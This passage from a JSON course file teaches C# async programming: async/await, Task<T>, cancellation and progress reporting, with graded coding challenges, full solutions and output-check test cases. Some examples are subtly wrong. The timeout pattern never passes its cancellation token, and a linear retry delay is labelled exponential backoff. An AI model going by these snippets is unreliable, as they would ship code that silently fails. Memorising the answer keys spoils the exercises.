                  "text": "Not understanding concurrency: Async doesn't mean parallel! In single-threaded context, it's about not blocking. Tasks run concurrently (interleaved), but might not be truly parallel."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting 'await'",
                  "consequence": "If you call 'MethodAsync()' without 'await', it starts but you don't wait for it! The method continues immediately. Use 'await' when you need the result.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Using Thread.Sleep() in async",
                  "consequence": "NEVER use Thread.Sleep() in async methods! It blocks the thread. Always use 'await Task.Delay()' instead.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Async void",
                  "consequence": "Only use 'async void' for event handlers! For regular methods, use 'async Task'. 'async void' can't be awaited and swallows exceptions.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Not understanding concurrency",
                  "consequence": "Async doesn't mean parallel! In single-threaded context, it's about not blocking. Tasks run concurrently (interleaved), but might not be truly parallel.",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-10-02",
          "title": "The async & await Keywords (The Modern Way)",
          "moduleId": "module-10",
          "order": 2,
          "estimatedMinutes": 15,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine you're a manager delegating tasks:\n\n'Hey team, START working on this report (don't block me!)'\n'I'll go do other things'\n'When the report is READY, I'll come back and review it'\n\nThat's async/await!\n\nASYNC keyword:\n• Marks a method as asynchronous\n• Enables 'await' keyword inside\n• Method can be 'paused' and 'resumed'\n• Returns Task or Task<T>\n\nAWAIT keyword:\n• 'Pause here until this completes'\n• Doesn't block the thread! (Thread is released for other work)\n• When done, execution continues from where it paused\n• Can only use inside 'async' methods\n\nThink of await like a bookmark: 'I'll pause here, do other things, and come back when this is ready.'\n\nRULE: If a method is async, you should await it! (Unless you intentionally want fire-and-forget)"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "using System;\nusing System.Net.Http;\nusing System.Threading.Tasks;\n\n// ASYNC method - returns Task\nasync Task DoWorkAsync()\n{\n    Console.WriteLine(\"Work started\");\n    await Task.Delay(1000);  // Pause for 1 second\n    Console.WriteLine(\"Work completed\");\n}\n\n// ASYNC method with return value - returns Task<string>\nasync Task<string> GetDataAsync()\n{\n    Console.WriteLine(\"Fetching data...\");\n    await Task.Delay(2000);\n    return \"Data retrieved!\";  // Returns string, but method returns Task<string>\n}\n\n// ASYNC method calling other async methods\nasync Task ProcessDataAsync()\n{\n    Console.WriteLine(\"Starting process...\");\n    \n    // Await other async methods\n    await DoWorkAsync();\n    \n    string data = await GetDataAsync();  // Get returned value\n    Console.WriteLine(\"Got: \" + data);\n    \n    Console.WriteLine(\"Process complete!\");\n}\n\n// Real-world example: HTTP request\nasync Task<string> DownloadWebPageAsync(string url)\n{\n    using HttpClient client = new HttpClient();  // Modern using declaration\n    Console.WriteLine(\"Downloading \" + url + \"...\");\n    string content = await client.GetStringAsync(url);  // Async HTTP call\n    Console.WriteLine(\"Download complete!\");\n    return content;  // client disposed at end of method scope\n}\n\n// Using the async methods\nawait ProcessDataAsync();\n\n// Multiple sequential awaits\nConsole.WriteLine(\"Step 1\");\nawait Task.Delay(500);\nConsole.WriteLine(\"Step 2\");\nawait Task.Delay(500);\nConsole.WriteLine(\"Step 3\");\n\n// Calling async method without await (fire-and-forget)\nTask backgroundTask = DoWorkAsync();  // Starts, doesn't wait\nConsole.WriteLine(\"This runs immediately!\");\nawait backgroundTask;  // Now wait for it",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`async Task MethodName()`**: 'async' modifier enables await. 'Task' is return type (like void for async). Method body can contain 'await' expressions.\n\n**`async Task<T> MethodName()`**: Async method that returns a value. Return type is Task<T> where T is the actual value type. Inside, you 'return T', not 'return Task<T>'!\n\n**`await expression`**: Waits for async operation without blocking thread. Expression must be 'awaitable' (Task, Task<T>, or custom awaitable). Execution pauses, then resumes when complete.\n\n**`Async all the way`**: If you call async method, you should await it. If your method awaits, it should be async. This propagates up the call stack - 'async all the way'!"
            },
            {
              "type": "WARNING",
              "title": "Critical Mistakes to Avoid",
              "content": "## The Deadly Sins of Async Programming!\n\n**1. async void is dangerous!**\nOnly use `async void` for event handlers! For everything else, use `async Task`. Why? `async void` methods can't be awaited, exceptions crash the process, and they're nearly impossible to test.\n\n**2. The sync-over-async deadlock!**\n```csharp\n// DEADLOCK in UI/ASP.NET apps!\nstring result = GetDataAsync().Result;  // NEVER do this!\nGetDataAsync().Wait();                   // Or this!\n```\nThe calling thread blocks, but the async continuation needs that same thread. Result: deadlock! Always use `await`.\n\n**3. Forgetting to await!**\n```csharp\nDoWorkAsync();  // Task starts but nobody waits!\n// Exceptions are lost, completion is unknown!\n```\nAlways await async methods unless you intentionally want fire-and-forget (and handle errors properly!).\n\n**4. Not going 'async all the way'!**\nIf you start using async, propagate it UP the call stack. Mixing sync and async creates performance problems and deadlock risks."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-10-02-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Build an async data processing pipeline!\n\n1. Create 'async Task<int> LoadDataAsync()':\n   - Print 'Loading data...'\n   - await Task.Delay(1000)\n   - Print 'Data loaded!'\n   - Return 42\n\n2. Create 'async Task<int> ProcessDataAsync(int input)':\n   - Print 'Processing data...'\n   - await Task.Delay(1500)\n   - Print 'Processing complete!'\n   - Return input * 2\n\n3. Create 'async Task<string> SaveResultAsync(int result)':\n   - Print 'Saving result...'\n   - await Task.Delay(800)\n   - Print 'Result saved!'\n   - Return 'Saved: ' + result\n\n4. Create 'async Task RunPipelineAsync()':\n   - Call all three methods in sequence (await each)\n   - Print final message from SaveResultAsync\n\n5. Call RunPipelineAsync() and await it",
              "starterCode": "using System;\nusing System.Threading.Tasks;\n\nasync Task<int> LoadDataAsync()\n{\n    // Implement\n}\n\nasync Task<int> ProcessDataAsync(int input)\n{\n    // Implement\n}\n\nasync Task<string> SaveResultAsync(int result)\n{\n    // Implement\n}\n\nasync Task RunPipelineAsync()\n{\n    // Load\n    int data = await LoadDataAsync();\n    \n    // Process\n    int processed = await ProcessDataAsync(data);\n    \n    // Save\n    string message = await SaveResultAsync(processed);\n    \n    Console.WriteLine(\"Pipeline result: \" + message);\n}\n\n// Run the pipeline\nawait RunPipelineAsync();",
              "solution": "using System;\nusing System.Threading.Tasks;\n\nasync Task<int> LoadDataAsync()\n{\n    Console.WriteLine(\"Loading data...\");\n    await Task.Delay(1000);\n    Console.WriteLine(\"Data loaded!\");\n    return 42;\n}\n\nasync Task<int> ProcessDataAsync(int input)\n{\n    Console.WriteLine(\"Processing data...\");\n    await Task.Delay(1500);\n    Console.WriteLine(\"Processing complete!\");\n    return input * 2;\n}\n\nasync Task<string> SaveResultAsync(int result)\n{\n    Console.WriteLine(\"Saving result...\");\n    await Task.Delay(800);\n    Console.WriteLine(\"Result saved!\");\n    return \"Saved: \" + result;\n}\n\nasync Task RunPipelineAsync()\n{\n    int data = await LoadDataAsync();\n    int processed = await ProcessDataAsync(data);\n    string message = await SaveResultAsync(processed);\n    Console.WriteLine(\"Pipeline result: \" + message);\n}\n\nawait RunPipelineAsync();\nConsole.WriteLine(\"All done!\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Loading\"",
                  "expectedOutput": "Loading",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Processing\"",
                  "expectedOutput": "Processing",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"Saving\"",
                  "expectedOutput": "Saving",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Output should contain \"Pipeline result\"",
                  "expectedOutput": "Pipeline result",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Async method: 'async Task<T> MethodName()'. Return value: 'return T' (not Task<T>!). Call: 'T result = await MethodAsync()'. Chain: await each step in sequence."
                },
                {
                  "level": 2,
                  "text": "Returning Task<T> instead of T: In 'async Task<int> GetNumber()', return 'return 42;' NOT 'return Task.FromResult(42);'! The async keyword handles Task wrapping."
                },
                {
                  "level": 3,
                  "text": "Async void instead of async Task: Only use 'async void' for event handlers! Regular methods should be 'async Task'. 'async void' can't be awaited and exceptions are hard to catch."
                },
                {
                  "level": 4,
                  "text": "Not awaiting async methods: 'DoWorkAsync();' without await starts the method but doesn't wait! The calling method continues immediately. Always await unless you want fire-and-forget."
                },
                {
                  "level": 5,
                  "text": "Deadlocks with .Result or .Wait(): In UI/ASP.NET apps, using '.Result' or '.Wait()' on Task can cause DEADLOCK! Always use 'await'. Blocking on async code is dangerous."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Returning Task<T> instead of T",
                  "consequence": "In 'async Task<int> GetNumber()', return 'return 42;' NOT 'return Task.FromResult(42);'! The async keyword handles Task wrapping.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Async void instead of async Task",
                  "consequence": "Only use 'async void' for event handlers! Regular methods should be 'async Task'. 'async void' can't be awaited and exceptions are hard to catch.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Not awaiting async methods",
                  "consequence": "'DoWorkAsync();' without await starts the method but doesn't wait! The calling method continues immediately. Always await unless you want fire-and-forget.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Deadlocks with .Result or .Wait()",
                  "consequence": "In UI/ASP.NET apps, using '.Result' or '.Wait()' on Task can cause DEADLOCK! Always use 'await'. Blocking on async code is dangerous.",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-10-03",
          "title": "Task<T> (The Promise of a Future Result)",
          "moduleId": "module-10",
          "order": 3,
          "estimatedMinutes": 15,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine you order a package online:\n• You get a TRACKING NUMBER immediately\n• The package isn't here YET\n• The tracking number is a PROMISE: 'Your package WILL arrive'\n• You can check status, wait for it, or do other things\n• When it arrives, you can open it and get the contents\n\nThat's Task<T>!\n\nTask<T> represents:\n• An ONGOING operation (might not be done yet)\n• A PROMISE of a future result of type T\n• You can:\n  - Check if it's complete: task.IsCompleted\n  - Wait for it: await task\n  - Get the result: await task (returns T)\n  - Run multiple: Task.WhenAll(), Task.WhenAny()\n\nTask = async operation that returns nothing (void)\nTask<T> = async operation that returns T\n\nThink: Task<T> = 'I don't have the value NOW, but I WILL have it soon. Here's a promise!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "using System;\nusing System.Threading.Tasks;\nusing System.Collections.Generic;\n\n// Method returning Task<int> (promise of future int)\nasync Task<int> CalculateAsync(int x, int y)\n{\n    await Task.Delay(1000);  // Simulate work\n    return x + y;\n}\n\n// Using Task<T>\nTask<int> resultTask = CalculateAsync(5, 3);\nConsole.WriteLine(\"Calculation started...\");\n\nint result = await resultTask;  // Wait and get the int\nConsole.WriteLine(\"Result: \" + result);\n\n// TASK METHODS\n\n// Task.WhenAll - wait for ALL tasks\nTask<int> t1 = CalculateAsync(1, 2);\nTask<int> t2 = CalculateAsync(3, 4);\nTask<int> t3 = CalculateAsync(5, 6);\n\nint[] results = await Task.WhenAll(t1, t2, t3);\nConsole.WriteLine(\"All results: \" + string.Join(\", \", results));\n\n// Task.WhenAny - wait for FIRST to complete\nTask<int> fast = Task.Delay(500).ContinueWith(_ => 1);\nTask<int> slow = Task.Delay(2000).ContinueWith(_ => 2);\n\nTask<int> firstDone = await Task.WhenAny(fast, slow);\nint firstResult = await firstDone;\nConsole.WriteLine(\"First completed: \" + firstResult);\n\n// Task.Run - run CPU-bound work on background thread\nTask<int> cpuTask = Task.Run(() => \n{\n    int sum = 0;\n    for (int i = 0; i < 1000000; i++)\n    {\n        sum += i;\n    }\n    return sum;\n});\n\nint sum = await cpuTask;\nConsole.WriteLine(\"Sum: \" + sum);\n\n// Task status properties\nTask<string> task = GetDataAsync();\n\nConsole.WriteLine(\"IsCompleted: \" + task.IsCompleted);\nConsole.WriteLine(\"Status: \" + task.Status);\n\nstring data = await task;\nConsole.WriteLine(\"IsCompleted: \" + task.IsCompleted);  // Now true!",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`Task<T> vs Task`**: Task<T> returns a value of type T. Task returns nothing (like void). Both represent async operations. Use await to get T from Task<T>.\n\n**`await Task.WhenAll(t1, t2, t3)`**: Waits for ALL tasks to complete. Returns array of results if tasks are Task<T>. More efficient than awaiting each task sequentially!\n\n**`await Task.WhenAny(t1, t2)`**: Waits for FIRST task to complete. Returns the completed task (not the result!). Await the returned task to get result. Useful for timeouts.\n\n**`Task.Run(() => code)`**: Runs code on background thread (thread pool). Use for CPU-intensive work. Returns Task or Task<T>. Don't use for I/O (use async I/O instead)."
            },
            {
              "type": "THEORY",
              "title": "ValueTask<T> - The Lightweight Alternative",
              "content": "## When to Use ValueTask vs Task\n\n**What is ValueTask?**\nValueTask<T> is a lightweight struct alternative to Task<T>. Unlike Task (which is a class and allocates on the heap), ValueTask can avoid allocations when the result is already available synchronously.\n\n**When to use ValueTask:**\n- Methods that OFTEN complete synchronously (e.g., cached values)\n- High-performance hot paths where allocation matters\n- Methods called very frequently in tight loops\n\n**When to stick with Task:**\n- Most normal async code (simpler and safer)\n- When you need to await multiple times\n- When you need Task.WhenAll/WhenAny (must convert with .AsTask())\n\n**Important ValueTask restrictions:**\n```csharp\nValueTask<int> GetValueAsync() { ... }\n\n// DON'T await multiple times!\nvar vt = GetValueAsync();\nvar x = await vt;\nvar y = await vt;  // WRONG! Undefined behavior!\n\n// DON'T block on it!\nvt.Result;  // WRONG!\nvt.GetAwaiter().GetResult();  // WRONG!\n\n// If you need reuse, convert first:\nTask<int> task = GetValueAsync().AsTask();\n```\n\n**Rule of thumb:** Start with Task<T>. Only use ValueTask<T> when profiling shows allocation is a bottleneck AND the method often completes synchronously."
            },
            {
              "type": "WARNING",
              "title": "Task Pitfalls",
              "content": "## Critical Task Mistakes!\n\n**1. Task.WhenAll hides exceptions!**\nWhen multiple tasks fail, WhenAll throws only the FIRST exception. Other exceptions are silently lost!\n```csharp\ntry { await Task.WhenAll(tasks); }\ncatch { \n    // Check ALL tasks for errors!\n    foreach (var t in tasks.Where(t => t.IsFaulted))\n        Console.WriteLine(t.Exception);\n}\n```\n\n**2. Sequential instead of parallel!**\n```csharp\n// SEQUENTIAL (slow!)\nawait Task1(); await Task2(); await Task3();\n\n// PARALLEL (fast!)\nvar t1 = Task1(); var t2 = Task2(); var t3 = Task3();\nawait Task.WhenAll(t1, t2, t3);\n```\n\n**3. WhenAny returns the TASK, not the result!**\n```csharp\nTask<int> first = await Task.WhenAny(t1, t2);\nint result = await first;  // Must await again!\n```\n\n**4. Using .Result blocks the thread!**\n`task.Result` and `task.Wait()` can cause deadlocks. Always use `await`!"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-10-03-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Build a download manager with Task<T>!\n\n1. Create 'async Task<int> DownloadFileAsync(string filename, int sizeKB)':\n   - Print 'Downloading [filename] ([sizeKB]KB)...'\n   - await Task.Delay(sizeKB * 10) to simulate download (bigger = slower)\n   - Print '[filename] complete!'\n   - Return sizeKB\n\n2. In main code:\n   - Start 4 downloads simultaneously (different sizes: 50KB, 150KB, 100KB, 200KB)\n   - Store in List<Task<int>>\n   - Use Task.WhenAll to wait for ALL downloads\n   - Sum the results to get total KB downloaded\n   - Calculate and display total MB (KB / 1024.0)\n\n3. BONUS: Use Task.WhenAny to detect which file finishes FIRST",
              "starterCode": "using System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Threading.Tasks;\n\nasync Task<int> DownloadFileAsync(string filename, int sizeKB)\n{\n    // Implement download simulation\n}\n\nConsole.WriteLine(\"Starting downloads...\");\n\n// Create list of download tasks\nList<Task<int>> downloads = new List<Task<int>>();\n\ndownloads.Add(DownloadFileAsync(\"file1.zip\", 50));\ndownloads.Add(DownloadFileAsync(\"file2.zip\", 150));\ndownloads.Add(DownloadFileAsync(\"file3.zip\", 100));\ndownloads.Add(DownloadFileAsync(\"file4.zip\", 200));\n\n// Wait for all\nint[] sizes = await Task.WhenAll(downloads);\n\n// Calculate total\nint totalKB = sizes.Sum();\ndouble totalMB = totalKB / 1024.0;\n\nConsole.WriteLine(\"Total downloaded: \" + totalKB + \"KB (\" + totalMB + \"MB)\");",
              "solution": "using System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Threading.Tasks;\n\nasync Task<int> DownloadFileAsync(string filename, int sizeKB)\n{\n    Console.WriteLine(\"Downloading \" + filename + \" (\" + sizeKB + \"KB)...\");\n    await Task.Delay(sizeKB * 10);\n    Console.WriteLine(filename + \" complete!\");\n    return sizeKB;\n}\n\nConsole.WriteLine(\"Starting downloads...\");\n\nList<Task<int>> downloads = new List<Task<int>>();\n\ndownloads.Add(DownloadFileAsync(\"file1.zip\", 50));\ndownloads.Add(DownloadFileAsync(\"file2.zip\", 150));\ndownloads.Add(DownloadFileAsync(\"file3.zip\", 100));\ndownloads.Add(DownloadFileAsync(\"file4.zip\", 200));\n\nint[] sizes = await Task.WhenAll(downloads);\n\nint totalKB = sizes.Sum();\ndouble totalMB = totalKB / 1024.0;\n\nConsole.WriteLine(\"\\nAll downloads complete!\");\nConsole.WriteLine(\"Total downloaded: \" + totalKB + \"KB (\" + totalMB.ToString(\"F2\") + \"MB)\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Downloading\"",
                  "expectedOutput": "Downloading",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"complete\"",
                  "expectedOutput": "complete",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"Total downloaded\"",
                  "expectedOutput": "Total downloaded",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Return Task<int>: 'async Task<int> Method()'. Store tasks: 'List<Task<int>> list'. Wait for all: 'int[] results = await Task.WhenAll(list)'. Sum array: 'results.Sum()'."
                },
                {
                  "level": 2,
                  "text": "Awaiting in loop: 'foreach (var t in tasks) await t' is SEQUENTIAL! Use 'await Task.WhenAll(tasks)' for parallel. Awaiting one-by-one defeats the purpose of async."
                },
                {
                  "level": 3,
                  "text": "Not storing task before await: 'await Method1(); await Method2();' is sequential. Start both first: 'var t1 = Method1(); var t2 = Method2(); await Task.WhenAll(t1, t2);' for parallel!"
                },
                {
                  "level": 4,
                  "text": "Using .Result: 'task.Result' BLOCKS the thread! Use 'await task' instead. '.Result' can cause deadlocks in UI/ASP.NET apps."
                },
                {
                  "level": 5,
                  "text": "Task.WhenAny result: WhenAny returns the TASK, not the result! Must await again: 'Task<int> firstTask = await Task.WhenAny(t1, t2); int result = await firstTask;'."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Awaiting in loop",
                  "consequence": "'foreach (var t in tasks) await t' is SEQUENTIAL! Use 'await Task.WhenAll(tasks)' for parallel. Awaiting one-by-one defeats the purpose of async.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Not storing task before await",
                  "consequence": "'await Method1(); await Method2();' is sequential. Start both first: 'var t1 = Method1(); var t2 = Method2(); await Task.WhenAll(t1, t2);' for parallel!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Using .Result",
                  "consequence": "'task.Result' BLOCKS the thread! Use 'await task' instead. '.Result' can cause deadlocks in UI/ASP.NET apps.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Task.WhenAny result",
                  "consequence": "WhenAny returns the TASK, not the result! Must await again: 'Task<int> firstTask = await Task.WhenAny(t1, t2); int result = await firstTask;'.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Task.WhenAll Exception Aggregation (CRITICAL!)",
                  "consequence": "When multiple tasks fail, Task.WhenAll throws ONLY THE FIRST exception! Other exceptions are SILENTLY LOST unless you check Task.Exception.InnerExceptions. Example: if 3 of 5 API calls fail, you only see the first error!",
                  "correction": "To see ALL exceptions: wrap in try/catch, then check 'task.Exception?.InnerExceptions' or handle the AggregateException. Pattern: 'try { await Task.WhenAll(tasks); } catch { foreach (var t in tasks.Where(t => t.IsFaulted)) { Log(t.Exception); } }'. Or use 'Task.WhenAll(tasks).ContinueWith(t => t.Exception?.Flatten())' to aggregate all failures."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-10-04",
          "title": "Common Async Patterns & Best Practices",
          "moduleId": "module-10",
          "order": 4,
          "estimatedMinutes": 15,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "You've learned async/await! But how do you use it WELL? Here are battle-tested patterns:\n\n1. ASYNC ALL THE WAY: If you call async, you should be async. Don't block with .Result or .Wait()!\n\n2. CONFIGURE AWAIT: In libraries, use 'ConfigureAwait(false)' to prevent deadlocks\n\n3. CANCELLATION: Long operations should support cancellation with CancellationToken\n\n4. ERROR HANDLING: Use try/catch around await - exceptions propagate normally!\n\n5. PARALLEL VS SEQUENTIAL:\n   - Sequential: await each task one by one\n   - Parallel: Start all, then Task.WhenAll\n\n6. CPU vs I/O:\n   - I/O bound: Use async/await (file, network, database)\n   - CPU bound: Use Task.Run for background processing\n\nThink: Async is like driving a car - you need to know not just HOW, but WHEN and WHERE to use each technique!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "using System;\nusing System.Threading;\nusing System.Threading.Tasks;\nusing System.Net.Http;\n\n// PATTERN 1: Error handling in async\nasync Task<string> FetchDataAsync()\n{\n    try\n    {\n        using HttpClient client = new HttpClient();  // Modern using declaration\n        return await client.GetStringAsync(\"https://api.example.com/data\");\n    }\n    catch (HttpRequestException ex)\n    {\n        Console.WriteLine(\"Network error: \" + ex.Message);\n        return \"Error occurred\";\n    }\n}\n\n// PATTERN 2: Cancellation with CancellationToken\nasync Task LongRunningTaskAsync(CancellationToken cancellationToken)\n{\n    for (int i = 0; i < 10; i++)\n    {\n        // Check if cancellation requested\n        cancellationToken.ThrowIfCancellationRequested();\n        \n        Console.WriteLine(\"Working... \" + i);\n        await Task.Delay(500, cancellationToken);\n    }\n    Console.WriteLine(\"Task completed!\");\n}\n\n// Using cancellation\nCancellationTokenSource cts = new CancellationTokenSource();\nTask task = LongRunningTaskAsync(cts.Token);\n\ncts.CancelAfter(2000);  // Cancel after 2 seconds\n\ntry\n{\n    await task;\n}\ncatch (OperationCanceledException)\n{\n    Console.WriteLine(\"Task was cancelled!\");\n}\n\n// PATTERN 3: Timeout pattern\nasync Task<string> GetDataWithTimeoutAsync(int timeoutMs)\n{\n    using CancellationTokenSource cts = new CancellationTokenSource();  // Modern using declaration\n    cts.CancelAfter(timeoutMs);\n    \n    try\n    {\n        return await FetchDataAsync();  // Your async operation\n    }\n    catch (OperationCanceledException)\n    {\n        return \"Operation timed out!\";  // cts disposed at end of method scope\n    }\n}\n\n// PATTERN 4: Progress reporting\nasync Task ProcessWithProgressAsync(IProgress<int> progress)\n{\n    for (int i = 0; i <= 100; i += 10)\n    {\n        await Task.Delay(200);\n        progress?.Report(i);  // Report progress\n    }\n}\n\n// Using progress\nvar progress = new Progress<int>(percent => \n{\n    Console.WriteLine(\"Progress: \" + percent + \"%\");\n});\n\nawait ProcessWithProgressAsync(progress);\n\n// PATTERN 5: Retry logic\nasync Task<string> RetryAsync(Func<Task<string>> operation, int maxRetries)\n{\n    for (int i = 0; i < maxRetries; i++)\n    {\n        try\n        {\n            return await operation();\n        }\n        catch (Exception ex)\n        {\n            if (i == maxRetries - 1) throw;  // Last attempt, rethrow\n            Console.WriteLine(\"Attempt \" + (i + 1) + \" failed, retrying...\");\n            await Task.Delay(1000 * (i + 1));  // Exponential backoff\n        }\n    }\n    throw new Exception(\"All retries failed\");\n}",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`CancellationToken`**: Pass to async methods to support cancellation. Check with 'token.ThrowIfCancellationRequested()'. Create with CancellationTokenSource. Essential for long operations!\n\n**`ConfigureAwait(false)`**: In library code: 'await task.ConfigureAwait(false)' prevents deadlocks. In app code (UI/ASP.NET), usually not needed. Advanced topic!\n\n**`IProgress<T>`**: Interface for reporting progress. Create with 'new Progress<T>(callback)'. Call 'progress.Report(value)' in async method. Useful for long operations with UI updates.\n\n**`Async error handling`**: Use try/catch around await! Exceptions from awaited tasks propagate normally. Task.WhenAll aggregates exceptions - check task.Exception for all errors."
            },
            {
              "type": "THEORY",
              "title": "IAsyncEnumerable - Streaming Data Asynchronously",
              "content": "## Async Streams with IAsyncEnumerable<T>\n\n**The Problem:**\n`Task<IEnumerable<T>>` waits for the ENTIRE collection before returning. What if you're loading thousands of records or streaming real-time data?\n\n**The Solution: IAsyncEnumerable<T>**\nIntroduced in C# 8.0, it lets you yield results asynchronously as they become available!\n\n```csharp\n// BEFORE: Wait for ALL data\nasync Task<List<int>> GetAllDataAsync()\n{\n    var results = new List<int>();\n    for (int i = 0; i < 100; i++)\n    {\n        await Task.Delay(100);\n        results.Add(i);\n    }\n    return results;  // 10 seconds later, ALL at once!\n}\n\n// AFTER: Stream as you go!\nasync IAsyncEnumerable<int> StreamDataAsync()\n{\n    for (int i = 0; i < 100; i++)\n    {\n        await Task.Delay(100);\n        yield return i;  // Available immediately!\n    }\n}\n\n// Consuming async streams\nawait foreach (var item in StreamDataAsync())\n{\n    Console.WriteLine(item);  // Process each as it arrives!\n}\n```\n\n**Best use cases:**\n- Streaming database query results\n- Real-time data feeds (stock prices, chat messages)\n- Large file processing line by line\n- API responses with pagination\n- Any scenario where you want results ASAP without waiting for all"
            },
            {
              "type": "THEORY",
              "title": "ConfigureAwait Deep Dive",
              "content": "## ConfigureAwait(false) - When and Why?\n\n**What does it do?**\nBy default, after an await, execution resumes on the original context (UI thread, ASP.NET request context). `ConfigureAwait(false)` says 'I don't need to resume on the original context.'\n\n**When to use ConfigureAwait(false):**\n- **Library code**: Always! You don't know if your code will be called from UI apps\n- **Internal helper methods**: When you don't need UI thread access\n- **Performance-critical code**: Avoids context-switch overhead\n\n**When NOT to use it:**\n- **UI code**: You NEED to be on UI thread to update controls\n- **ASP.NET Core**: No synchronization context, so it's a no-op anyway\n- **Code that accesses HttpContext**: Needs the request context\n\n```csharp\n// Library code - use ConfigureAwait(false)\npublic async Task<string> FetchDataAsync()\n{\n    var response = await httpClient\n        .GetAsync(url)\n        .ConfigureAwait(false);  // Don't capture context!\n        \n    return await response.Content\n        .ReadAsStringAsync()\n        .ConfigureAwait(false);  // On EVERY await!\n}\n\n// UI code - DON'T use it\nprivate async void Button_Click(object sender, EventArgs e)\n{\n    string data = await FetchDataAsync();\n    label.Text = data;  // Needs UI thread!\n}\n```\n\n**Modern guidance:** Use ConfigureAwait(false) in library code. For app code in ASP.NET Core (no sync context), it doesn't matter."
            },
            {
              "type": "WARNING",
              "title": "Async Pattern Pitfalls",
              "content": "## Critical Best Practices!\n\n**1. Always support CancellationToken in long operations!**\nUsers expect to cancel slow operations. APIs expect it. Not supporting cancellation is a usability bug.\n\n**2. Dispose CancellationTokenSource!**\n```csharp\nusing var cts = new CancellationTokenSource();\n// CTS implements IDisposable - always dispose!\n```\n\n**3. Don't swallow OperationCanceledException!**\nCancellation is not an error - it's expected behavior. Catch it to clean up, but don't treat it as a failure.\n\n**4. ConfigureAwait(false) on EVERY await in libraries!**\nOne missed ConfigureAwait can still cause deadlock. Be consistent!\n\n**5. Progress callbacks happen on captured context!**\nProgress<T> marshals to the original thread. If UI thread is blocked, progress updates queue up. Never block on async code!\n\n**6. Fire-and-forget needs error handling!**\n```csharp\n// DANGEROUS - exceptions are lost!\n_ = DoWorkAsync();\n\n// BETTER - log errors\n_ = DoWorkAsync().ContinueWith(t => \n    Log(t.Exception), TaskContinuationOptions.OnlyOnFaulted);\n```"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-10-04-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Build a robust file processor with cancellation and progress!\n\n1. Create 'async Task ProcessFilesAsync(int fileCount, CancellationToken cancellationToken, IProgress<int> progress)':\n   - Loop from 0 to fileCount\n   - For each file:\n     - Check cancellation: cancellationToken.ThrowIfCancellationRequested()\n     - Print 'Processing file [i]...'\n     - await Task.Delay(500, cancellationToken)\n     - Report progress: progress?.Report((i + 1) * 100 / fileCount)\n   - Print 'All files processed!'\n\n2. In main code:\n   - Create CancellationTokenSource\n   - Create Progress<int> that prints progress percentage\n   - Start processing 10 files\n   - Cancel after 3 seconds with cts.CancelAfter(3000)\n   - Wrap in try/catch to handle OperationCanceledException\n   - Print appropriate message if cancelled or completed",
